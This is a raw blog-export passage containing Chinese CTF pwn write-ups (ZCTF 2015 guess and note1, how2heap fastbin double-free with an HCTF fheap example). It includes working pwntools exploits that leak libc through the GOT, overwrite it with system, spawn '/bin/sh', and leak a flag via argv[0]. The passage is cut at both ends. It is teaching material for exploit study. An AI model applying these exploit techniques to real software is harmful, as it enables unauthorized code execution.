<span class=\"title\">editnote</span><span class=\"params\">(title,content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'option---&gt;&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(title)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">shownote</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'option---&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    payload = (<span class=\"number\">0x100</span> + <span class=\"number\">0x10</span>)*<span class=\"string\">'a'</span>+p64(<span class=\"number\">0</span>)+p64(puts_got - <span class=\"number\">0x70</span>)+<span class=\"string\">'b'</span></div><div class=\"line\">    new(<span class=\"string\">'a'</span>, <span class=\"string\">'aa'</span>, <span class=\"string\">'aaa'</span>)</div><div class=\"line\">    new(<span class=\"string\">'b'</span>, <span class=\"string\">'bb'</span>, <span class=\"string\">'bbb'</span>)</div><div class=\"line\">    editnote(<span class=\"string\">'a'</span>, payload)</div><div class=\"line\">    shownote()</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content='</span>)</div><div class=\"line\">    buf = p.recvuntil(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>] + <span class=\"string\">'\\x00\\x00'</span></div><div class=\"line\">    puts = u64(buf)</div><div class=\"line\">    <span class=\"keyword\">print</span> puts</div><div class=\"line\">    libc_base = puts - puts_off</div><div class=\"line\">    log.success(<span class=\"string\">'Libc base = '</span> + hex(libc_base))</div><div class=\"line\">    read = libc_base + read_off</div><div class=\"line\">    system = libc_base + system_off</div><div class=\"line\">    new_got = p64(puts) + <span class=\"string\">'a'</span>*<span class=\"number\">24</span>+p64(read)+<span class=\"string\">'a'</span>*<span class=\"number\">40</span>+p64(system)</div><div class=\"line\">    editnote(<span class=\"string\">''</span>,new_got)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">    p.interactive()</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>","excerpt":"","more":"<p>整理了一下ZCTF2015的pwn，看看出题思路。。</p>\n<h2 id=\"guess-100\"><a href=\"#guess-100\" class=\"headerlink\" title=\"guess 100\"></a>guess 100</h2><p>这个应该时之前ctftime上的一个比赛的题，应该时zctf借鉴的。。我觉得这次也很有可能会出之前比赛的题目</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">[*] <span class=\"string\">'/home/ubuntu/ctf-problem/2015zctf/pwn/pwn1/guess'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     amd64<span class=\"bullet\">-64</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    Canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE</div></pre></td></tr></table></figure>\n<p>有canary，但是有栈溢出，栈溢出后<code>__stack_check_fail</code>会打印程序的名字，也就是<code>argv[0]</code>的值，我们溢出修改<code>argv[0]</code>的值为之前加载到内存的<code>flag</code>的地址即可。<br><a href=\"http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf\">相关的ppt</a></p>\n<p>断点在<code>fgets(&amp;::s, v8 + 1, stream);</code>，也就是<code>.text:0000000000400A61                 call    _fgets</code>前</p>\n<figure class=\"highlight lisp\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div></pre></td><td class=\"code\"><pre><div class=\"line\">fseek(<span class=\"name\">stream</span>, <span class=\"number\">0</span>LL, <span class=\"number\">0</span>)<span class=\"comment\">;</span></div><div class=\"line\">fgets(<span class=\"name\">&amp;</span>:<span class=\"symbol\">:s</span>, v8 + <span class=\"number\">1</span>, stream)<span class=\"comment\">;</span></div><div class=\"line\">fclose(<span class=\"name\">stream</span>)<span class=\"comment\">;</span></div></pre></td></tr></table></figure>\n<p>gdb查看得到加载的地址</p>\n<figure class=\"highlight x86asm\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; pd</div><div class=\"line\"> ► <span class=\"number\">0x400a61</span>    <span class=\"keyword\">call</span>   fgets@plt                     &lt;<span class=\"number\">0x400800</span>&gt;</div><div class=\"line\"><span class=\"symbol\">        s:</span> <span class=\"number\">0x6010c0</span> ◂— <span class=\"number\">0x0</span></div><div class=\"line\"><span class=\"symbol\">        n:</span> <span class=\"number\">0x24</span></div><div class=\"line\"><span class=\"symbol\">        stream:</span> <span class=\"number\">0x602010</span> ◂— <span class=\"number\">0xfbad2488</span></div><div class=\"line\"> </div><div class=\"line\">   <span class=\"number\">0x400a66</span>    <span class=\"keyword\">mov</span>    <span class=\"built_in\">rax</span>, <span class=\"built_in\">qword</span> <span class=\"built_in\">ptr</span> [<span class=\"built_in\">rbp</span> - <span class=\"number\">0x48</span>]</div><div class=\"line\">   <span class=\"number\">0x400a6a</span>    <span class=\"keyword\">mov</span>    <span class=\"built_in\">rdi</span>, <span class=\"built_in\">rax</span></div><div class=\"line\">   <span class=\"number\">0x400a6d</span>    <span class=\"keyword\">call</span>   fclose@plt                    &lt;<span class=\"number\">0x4007a0</span>&gt;</div></pre></td></tr></table></figure>\n<p>exp如下，第一个用于获取<code>flag</code>长度，第二个用于攻击：</p>\n<figure class=\"highlight livecodeserver\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"built_in\">from</span> pwn import *</div><div class=\"line\"> </div><div class=\"line\"> <span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">     <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">40</span>):</div><div class=\"line\">         payload = i *<span class=\"string\">'a'</span></div><div class=\"line\">         p = <span class=\"built_in\">process</span>(<span class=\"string\">'./guess'</span>)</div><div class=\"line\">         print p.recvuntil(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">         p.sendline(payload)</div><div class=\"line\">         <span class=\"built_in\">result</span> = p.recvuntil(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">         <span class=\"keyword\">if</span> <span class=\"string\">'ZCTF'</span> <span class=\"keyword\">in</span> <span class=\"built_in\">result</span>:</div><div class=\"line\">             print <span class=\"string\">'len='</span>, i</div><div class=\"line\">             p.<span class=\"built_in\">close</span>()</div><div class=\"line\">\t\t\t break</div><div class=\"line\">         p.<span class=\"built_in\">close</span>()</div></pre></td></tr></table></figure>\n<figure class=\"highlight sqf\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn import *</div><div class=\"line\"> context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"> </div><div class=\"line\"> s = process(<span class=\"string\">'./guess'</span>)</div><div class=\"line\"> s.recvuntil(<span class=\"string\">'please guess the flag:'</span>)</div><div class=\"line\"> payload=<span class=\"string\">'ZCTF&#123;'</span>+<span class=\"string\">'A'</span>*(<span class=\"number\">32</span>-<span class=\"number\">5</span>) + <span class=\"string\">'\\x00'</span> + <span class=\"string\">'a'</span>*<span class=\"number\">263</span> + p64(<span class=\"number\">0</span>x6010C5)</div><div class=\"line\"> s.sendline(payload)</div><div class=\"line\"> s.recvuntil(<span class=\"string\">'***: '</span>)</div><div class=\"line\"> flagt = s.recvuntil(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">27</span>]</div><div class=\"line\"> <span class=\"built_in\">flag</span>  = <span class=\"string\">'ZCTF&#123;'</span></div><div class=\"line\"> <span class=\"keyword\">for</span> i <span class=\"built_in\">in</span> flagt:</div><div class=\"line\">     <span class=\"built_in\">flag</span> += chr(ord(i)^ord(<span class=\"string\">'A'</span>))</div><div class=\"line\"> print <span class=\"built_in\">flag</span></div><div class=\"line\"> s.close()</div></pre></td></tr></table></figure>\n<h2 id=\"note1-200\"><a href=\"#note1-200\" class=\"headerlink\" title=\"note1 200\"></a>note1 200</h2><p>checksec</p>\n<figure class=\"highlight yaml\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div></pre></td><td class=\"code\"><pre><div class=\"line\">pwndbg&gt; checksec </div><div class=\"line\">[*] <span class=\"string\">'/home/ubuntu/ctf-problem/2015zctf/pwn/pwn2/note1'</span></div><div class=\"line\"><span class=\"attr\">    Arch:</span>     amd64<span class=\"bullet\">-64</span>-little</div><div class=\"line\"><span class=\"attr\">    RELRO:</span>    Partial RELRO</div><div class=\"line\"><span class=\"attr\">    Stack:</span>    Canary found</div><div class=\"line\"><span class=\"attr\">    NX:</span>       NX enabled</div><div class=\"line\"><span class=\"attr\">    PIE:</span>      <span class=\"literal\">No</span> PIE</div></pre></td></tr></table></figure>\n<p>看了下程序，edit可以溢出修改到下一个note的指针，输出got表里puts的地址，因为这里的content是偏移了0x70位的，所以要减去0x70。最后修改atoi为system，输入/bin/sh</p>\n<p>但是有一个地方不明白，got表的高8byte是什么？</p>\n<figure class=\"highlight dns\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"number\">0x602018</span> &lt;puts@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a7d690</span>\t<span class=\"number\">0</span>x00000<span class=\"number\">00000400706</span></div><div class=\"line\"><span class=\"number\">0x602028</span> &lt;printf@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a63800</span>\t<span class=\"number\">0</span>x00007ffff7ad9650</div><div class=\"line\"><span class=\"number\">0x602038</span> &lt;read@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7b04670</span>\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a2e740</span></div><div class=\"line\"><span class=\"number\">0x602048</span> &lt;strcmp@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff7aac9c0\t<span class=\"number\">0</span>x00000<span class=\"number\">00000400766</span></div><div class=\"line\"><span class=\"number\">0x602058</span> &lt;malloc@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff<span class=\"number\">7a91580</span>\t<span class=\"number\">0</span>x00007ffff7a7de70</div><div class=\"line\"><span class=\"number\">0x602068</span> &lt;atoi@got.plt&gt;:\t<span class=\"number\">0</span>x00007ffff7a44e80\t<span class=\"number\">0</span>x000000<span class=\"number\">00004007a6</span></div></pre></td></tr></table></figure>\n<p>exp:</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><div class=\"line\">1</div><div class=\"line\">2</div><div class=\"line\">3</div><div class=\"line\">4</div><div class=\"line\">5</div><div class=\"line\">6</div><div class=\"line\">7</div><div class=\"line\">8</div><div class=\"line\">9</div><div class=\"line\">10</div><div class=\"line\">11</div><div class=\"line\">12</div><div class=\"line\">13</div><div class=\"line\">14</div><div class=\"line\">15</div><div class=\"line\">16</div><div class=\"line\">17</div><div class=\"line\">18</div><div class=\"line\">19</div><div class=\"line\">20</div><div class=\"line\">21</div><div class=\"line\">22</div><div class=\"line\">23</div><div class=\"line\">24</div><div class=\"line\">25</div><div class=\"line\">26</div><div class=\"line\">27</div><div class=\"line\">28</div><div class=\"line\">29</div><div class=\"line\">30</div><div class=\"line\">31</div><div class=\"line\">32</div><div class=\"line\">33</div><div class=\"line\">34</div><div class=\"line\">35</div><div class=\"line\">36</div><div class=\"line\">37</div><div class=\"line\">38</div><div class=\"line\">39</div><div class=\"line\">40</div><div class=\"line\">41</div><div class=\"line\">42</div><div class=\"line\">43</div><div class=\"line\">44</div><div class=\"line\">45</div><div class=\"line\">46</div><div class=\"line\">47</div><div class=\"line\">48</div><div class=\"line\">49</div><div class=\"line\">50</div><div class=\"line\">51</div><div class=\"line\">52</div><div class=\"line\">53</div><div class=\"line\">54</div><div class=\"line\">55</div><div class=\"line\">56</div><div class=\"line\">57</div><div class=\"line\">58</div><div class=\"line\">59</div><div class=\"line\">60</div><div class=\"line\">61</div><div class=\"line\">62</div><div class=\"line\">63</div><div class=\"line\">64</div></pre></td><td class=\"code\"><pre><div class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</div><div class=\"line\"></div><div class=\"line\">DEBUG = <span class=\"number\">0</span></div><div class=\"line\"><span class=\"keyword\">if</span> DEBUG:</div><div class=\"line\">    context.log_level = <span class=\"string\">'debug'</span></div><div class=\"line\"></div><div class=\"line\">elf = ELF(<span class=\"string\">'./note1'</span>)</div><div class=\"line\">libc = ELF(<span class=\"string\">'libc.so.6'</span>)</div><div class=\"line\"></div><div class=\"line\">atoi_got = elf.got[<span class=\"string\">'atoi'</span>]</div><div class=\"line\">puts_got = elf.got[<span class=\"string\">'puts'</span>]</div><div class=\"line\">puts_off = libc.symbols[<span class=\"string\">'puts'</span>]</div><div class=\"line\">read_off = libc.symbols[<span class=\"string\">'read'</span>]</div><div class=\"line\">system_off = libc.symbols[<span class=\"string\">'system'</span>]</div><div class=\"line\"></div><div class=\"line\">p = process(<span class=\"string\">'./note1'</span>)</div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">new</span><span class=\"params\">(title, types, content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'option---&gt;&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'1'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(title)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(types)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">editnote</span><span class=\"params\">(title,content)</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'option---&gt;&gt;'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'3'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(title)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">':'</span>)</div><div class=\"line\">    p.sendline(content)</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">shownote</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    p.recvuntil(<span class=\"string\">'option---&gt;&gt;\\n'</span>)</div><div class=\"line\">    p.sendline(<span class=\"string\">'2'</span>)</div><div class=\"line\">    <span class=\"keyword\">return</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">main</span><span class=\"params\">()</span>:</span></div><div class=\"line\">    payload = (<span class=\"number\">0x100</span> + <span class=\"number\">0x10</span>)*<span class=\"string\">'a'</span>+p64(<span class=\"number\">0</span>)+p64(puts_got - <span class=\"number\">0x70</span>)+<span class=\"string\">'b'</span></div><div class=\"line\">    new(<span class=\"string\">'a'</span>, <span class=\"string\">'aa'</span>, <span class=\"string\">'aaa'</span>)</div><div class=\"line\">    new(<span class=\"string\">'b'</span>, <span class=\"string\">'bb'</span>, <span class=\"string\">'bbb'</span>)</div><div class=\"line\">    editnote(<span class=\"string\">'a'</span>, payload)</div><div class=\"line\">    shownote()</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'\\n'</span>)</div><div class=\"line\">    p.recvuntil(<span class=\"string\">'content='</span>)</div><div class=\"line\">    buf = p.recvuntil(<span class=\"string\">'\\n'</span>)[:<span class=\"number\">-1</span>] + <span class=\"string\">'\\x00\\x00'</span></div><div class=\"line\">    puts = u64(buf)</div><div class=\"line\">    <span class=\"keyword\">print</span> puts</div><div class=\"line\">    libc_base = puts - puts_off</div><div class=\"line\">    log.success(<span class=\"string\">'Libc base = '</span> + hex(libc_base))</div><div class=\"line\">    read = libc_base + read_off</div><div class=\"line\">    system = libc_base + system_off</div><div class=\"line\">    new_got = p64(puts) + <span class=\"string\">'a'</span>*<span class=\"number\">24</span>+p64(read)+<span class=\"string\">'a'</span>*<span class=\"number\">40</span>+p64(system)</div><div class=\"line\">    editnote(<span class=\"string\">''</span>,new_got)</div><div class=\"line\">    p.sendline(<span class=\"string\">'/bin/sh'</span>)</div><div class=\"line\">    p.interactive()</div><div class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span></div><div class=\"line\"></div><div class=\"line\"><span class=\"keyword\">if</span> __name__ == <span class=\"string\">'__main__'</span>:</div><div class=\"line\">    main()</div></pre></td></tr></table></figure>"},{"title":"glibc-heap导图","date":"2017-05-14T12:16:45.000Z","_content":"\n![heap](heap.png)\n\n[img from](http://blog.a7vinx.me/)","source":"_posts/glibc-heap导图.md","raw":"---\ntitle: glibc-heap导图\ntags:\n  - heap\n  - PWN\ncategories: []\ndate: 2017-05-14 20:16:45\n---\n\n![heap](heap.png)\n\n[img from](http://blog.a7vinx.me/)","slug":"glibc-heap导图","published":1,"updated":"2017-05-14T12:23:38.828Z","comments":1,"layout":"post","photos":[],"link":"","_id":"cjcpz0k2w0041hv18nddppa41","content":"<p><img src=\"/2017/05/14/glibc-heap导图/heap.png\" alt=\"heap\"></p>\n<p><a href=\"http://blog.a7vinx.me/\" target=\"_blank\" rel=\"external\">img from</a></p>\n","excerpt":"","more":"<p><img src=\"/2017/05/14/glibc-heap导图/heap.png\" alt=\"heap\"></p>\n<p><a href=\"http://blog.a7vinx.me/\">img from</a></p>\n"},{"title":"how2heap","date":"2017-03-28T09:45:10.000Z","_content":"\n## 0x00\n\n堆溢出搞了很久，道理我都懂，但是就是在实战中用不起来，只能花功夫一定要在这周把堆溢出啃下来。\n以[how2heap](https://github.com/shellphish/how2heap)为学习路径，step by step，记录下，可能的话，帮助到后来的人。\n\n> | File | Technique | Applicable CTF Challenges |\n|------|-----------|---------------------------|\n| [first_fit.c](first_fit.c) | 演示glibc malloc的首次适应(first-fit)行为 | |\n| [fastbin_dup.c](fastbin_dup.c) | 通过操作fastbin已释放的表，来除法malloc以返回已经分配过的堆指针| |\n| [fastbin_dup_into_stack.c](fastbin_dup_into_stack.c) | 通过操作fastbin的已释放的表，来触发malloc来得到一个几乎任意指向的指针 | [9447-search-engine](https://github.com/ctfs/write-ups-2015/tree/master/9447-ctf-2015/exploitation/search-engine) |\n| [unsafe_unlink.c](unsafe_unlink.c) | Exploiting free on a corrupted chunk to get arbitrary write. | [HITCON CTF 2014-stkof](http://acez.re/ctf-writeup-hitcon-ctf-2014-stkof-or-modern-heap-overflow/) |\n| [house_of_spirit.c](house_of_spirit.c) | Frees a fake fastbin chunk to get malloc to return a nearly-arbitrary pointer. | [hack.lu CTF 2014-OREO](https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/oreo) |\n| [poison_null_byte.c](poison_null_byte.c) | Exploiting a single null byte overflow. | [PlaidCTF 2015-plaiddb](https://github.com/ctfs/write-ups-2015/tree/master/plaidctf-2015/pwnable/plaiddb) |\n| [house_of_lore.c](house_of_lore.c) | Tricking malloc into returning a nearly-arbitrary pointer by abusing the smallbin freelist. | |\n| [overlapping_chunks.c](overlapping_chunks.c) | 利用覆写已释放在unsortbin链中chunk的size位，去获得一个重叠在已分配chunk的新的分配 | [hack.lu CTF 2015-bookstore](https://github.com/ctfs/write-ups-2015/tree/master/hack-lu-ctf-2015/exploiting/bookstore) |\n| [house_of_force.c](house_of_force.c) | 溢出Top chunk头去分配，来得到一个接近任意地址的指针 | [Boston Key Party 2016-cookbook](https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/pwn/cookbook-6), [BCTF 2016-bcloud](https://github.com/ctfs/write-ups-2016/tree/master/bctf-2016/exploit/bcloud-200) |\n| [unsorted_bin_attack.c](unsorted_bin_attack.c) | 利用在unsortbin的freelist链表里的一个已释放chunk的overwrite去在任意地址中写入一个大数 | [0ctf 2016-zerostorage](https://github.com/ctfs/write-ups-2016/tree/master/0ctf-2016/exploit/zerostorage-6) |\n| [house_of_einherjar.c](house_of_einherjar.c) | Exploiting a single null byte overflow to trick malloc into returning a controlled pointer  | [Seccon 2016-tinypad](https://gist.github.com/hhc0null/4424a2a19a60c7f44e543e32190aaabf) |\n\n<!--more-->\n## 0x01 first fit\n\n这里主要提供了一个UAF的使用示例。glibc使用的first-fit算法来选择空间分配，当我们之前释放的chunk足够大时，程序就会最先使用这个chunk。但此时释放的上一个使用此chunk的指针依然指向这个chunk，我们可以通过一个已经free过的指针来控制这个chunk。\n\n## 0x02 fastbin dup\n\nfastbin通过一个链表来维护空闲的chunk，当一个chunk被free掉之后，会将这个chunk接回链表的头部，下次申请时会申请这个chunk。\n\n## 0x03 fastbin dup into stack(double-free)\n\n这个就是double-free的一个利用。\n当我们`malloc`一个小于`128`的堆块的时候，`ptmalloc`就会调用到`fastbin`。`fastbin`是由一个单链表组成的，遵循`FIFO`原则，由于`fastbin`在`free`的时候并不会对指针是否已经释放做检查，所以我们可以构造出一个循环链表的情况。\n比如：\n\n```\nint *a = malloc(8) ;\nint *b = malloc(8);\nfree(a);\nfree(b);\n```\n此时维护的一个链表结构为\n`[head] -> b -> a -> null`\n\n当我们再次\n\n`free(a);`\n\n此时的链表结构为\n\n`[head] -> a -> b -> a -> null`\n\n紧接着我们申请两次堆\n\n```\n*a = malloc(8);\n*b = malloc(8);\n```\n\n此时我们维护的链表结构为\n\n`[head] -> a -> null`\n\n如果我们修改`a`的前八个字节为我们的希望的地址，当我们两次`malloc`之后，我们就能得到一个指向任意地址的指针。\n\n```\n*a = &attribute_addr;\nint *c = malloc(8);   //c == a\nint *d = malloc(8);   // d == attribute_addr\n```\n\n维护的链表如下\n\n```\n[head] -> a -> null\n[head] -> a -> attribute\n[head] -> attribute\n```\n\n于是我们就可以得到一个`8bit`的任意地址写了。\n\n以下用_2016hctf_的`就是干`为例\n\n#### 例题\n\n首先分析程序，先查看程序的保护\n\n```\nubuntu@VM-250-199-ubuntu:~/ctf-problem/2016hctf/pwn/fheap$ checksec pwn-f \n[*] '/home/ubuntu/ctf-problem/2016hctf/pwn/fheap/pwn-f'\n    Arch:     amd64-64-little\n    RELRO:    Partial RELRO\n    Stack:    Canary found\n    NX:       NX enabled\n    PIE:      PIE enabled\n```\n\n由于程序打开的PIE，我们在gdb调试的时候很不方便，gdb默认是关闭`aslr`的，但是它会给程序加上一个默认的基地址`0x555555554000`\n\n这个程序有两个功能：\n\n1. 添加字符串\n2. 删除一个字符串\n\n其中，存储字符串的结构题如下：\n\n```\n00000000 info            struc ; (sizeof=0x20, mappedto_1)\n00000000 content         db 16 dup(?)            ; string(C)\n00000010 size            dq ?\n00000018 DestroyFunc      dq ?                    ; 这里是程序的调用的free函数的地址\n00000020 info            ends\n\nstruct info{\n\tchar cintent[16];\n    int size;\n    void* DestroyFunc;\n};\n```\n\n当我们申请小于15字节的长度时，字符串会直接保存在`info.content`中。当我们申请长度大于15的字符串的时候，程序会另外申请一个字符串大小的堆，同时这个堆的地址保存在原本的`info.content`中\n\n```\n    if ( nbytesa > 15 )\n    {\n      dest = (char *)malloc(nbytesa);\n      if ( !dest )\n      {\n        puts(\"malloc faild!\");\n        exit(1);\n      }\n      strncpy(dest, &buf, nbytesa);\n      *(_QWORD *)ptr = dest;\n      *((_QWORD *)ptr + 3) = sub_D6C;           // free(*content)\n                                                // free(content)\n    }\n    else\n    {\n      strncpy(ptr, &buf, nbytesa);\n      *((_QWORD *)ptr + 3) = sub_D52;           // free(content)\n    }\n```\n\n小于15时堆内存分布\n```\npwndbg> x/6xg 0x555555757000\n0x555555757000:\t0x0000000000000000\t0x0000000000000031\n0x555555757010:\t0x0000000061616161\t0x0000000000000000           // content\n0x555555757020:\t0x0000000000000004\t0x0000555555554d52           // size + DestroyFunc\n```\n\n大于15时堆内存的分布情况\n```\npwndbg> x/6xg 0x555555757060\n0x555555757060:\t0x0000000000000000\t0x0000000000000021\n0x555555757070:\t0x6161616161616161\t0x6262626262626161           // content\n0x555555757080:\t0x000000000a626262\t0x0000000000020f81\npwndbg> x/6xg 0x555555757030\n0x555555757030:\t0x0000000000000000\t0x0000000000000031\n0x555555757040:\t0x0000555555757070\t0x0000000000000000          // new malloc addr\n0x555555757050:\t0x0000000000000014\t0x0000555555554d6c          // size +  DestroyFunc\n```\n\n再来看一下全局变量的堆管理情况\n\n```\npwndbg> telescope 0x555555554000+0x2020C0\n00:0000│   0x5555557560c0 (__bss_start+32) ◂— 0x1\n01:0008│   0x5555557560c8 (__bss_start+40) —▸ 0x555555757010 ◂— 0x61616161 /* 'aaaa' */\n02:0010│   0x5555557560d0 (__bss_start+48) ◂— 0x1\n03:0018│   0x5555557560d8 (__bss_start+56) —▸ 0x555555757040 —▸ 0x555555757070 ◂— 'aaaaaaaaaabbbbb...'\n04:0020│   0x5555557560e0 (__bss_start+64) ◂— 0x1\n05:0028│   0x5555557560e8 (__bss_start+72) —▸ 0x555555757090 —▸ 0x5555557570c0 ◂— 'ccc\\naaaaaabbbbb...'\n06:0030│   0x5555557560f0 (__bss_start+80) ◂— 0x0\n... ↓\npwndbg> x/6xg 0x555555554000+0x2020C0\n0x5555557560c0:\t0x0000000000000001\t0x0000555555757010\n0x5555557560d0:\t0x0000000000000001\t0x0000555555757040\n0x5555557560e0:\t0x0000000000000001\t0x0000555555757090\n```\n堆管理结构中，前一个为表示是否占用，后一个表示字符串的地址。\n\n看一下删除操作的函数实现：\n```\nif ( *((_QWORD *)&manage + 2 * v1 + 1) )\n  {\n    printf(\"Are you sure?:\");\n    read(0, &buf, 0x100uLL);\n    if ( !strncmp(&buf, \"yes\", 3uLL) )\n    {\n      (*(void (__fastcall **)(_QWORD, const char *))(*((_QWORD *)&manage + 2 * v1 + 1) + 24LL))(\n        *((_QWORD *)&manage + 2 * v1 + 1),\n        \"yes\");\n      *((_DWORD *)&manage + 4 * v1) = 0;\n    }\n  }\n```\n\n官方的源码如下：\n```\nvoid deleteStr() {\n    int id;\n\tchar buf[0x100];\n    printf(\"Pls give me the string id you want to delete\\nid:\");\n    id = getInt();\n    if (id < 0 || id > 0x10) {\n        printf(\"Invalid id\\n\");\n    }\n    if (Strings[id].str) {\n\t\tprintf(\"Are you sure?:\");\n\t\tread(STDIN_FILENO,buf,0x100);\n\t\tif(strncmp(buf,\"yes\",3)) {\n\t\t\treturn;\n\t\t}\n        Strings[id].str->free(Strings[id].str);\n        Strings[id].inuse = 0;\n    }\n}\n```\n\n这里存在一个漏洞，程序检查的是字符串的结构体指针是否为0，但事实上是不可能为0的。同时利用`fastbin`不会检查是否已释放的特点，我们可以构造`double-free`那么我们就可以利用这一点，如果在结构体调用的`DestroyFunc`覆盖为其他函数，我们就可以造成任意函数执行。如果我们将堆上的函数覆盖位`puts`时，程序将会执行`puts(contents)`而不是`free(content)`，通过适当`content`，我们可以泄露程序基址。\n在结构体的`DestroyFunc`部分，即使开了`PIE`，程序的最后三位也是不变的，我们只需要覆盖最后3位或2位即可。\n\n所以总结，此题的漏洞点在`UAF`&`double-free`。\necp:\n\n```\n#! /usr/bin/python\nfrom pwn import *\n\ncontext.log_level = 'debug'\ntarget = process('pwn-f')\n\ndef create(size, string):\n    target.recvuntil('quit')\n    target.sendline('create ')\n    target.recvuntil('size:')\n    target.sendline(str(size))\n    target.recvuntil('str:')\n    target.send(string)\n\n\ndef 